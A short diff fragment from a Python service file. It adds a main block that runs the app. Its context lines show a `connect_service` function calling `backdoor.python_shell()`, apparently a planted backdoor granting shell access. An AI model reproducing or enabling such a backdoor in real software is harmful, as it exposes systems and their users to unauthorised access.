@@ -90,3 +90,7 @@ def connect_service(service_id: str) -> str:
         backdoor.python_shell()
 
     return "Service connected"
+
+
+if __name__ == "__main__":
+    app.run()
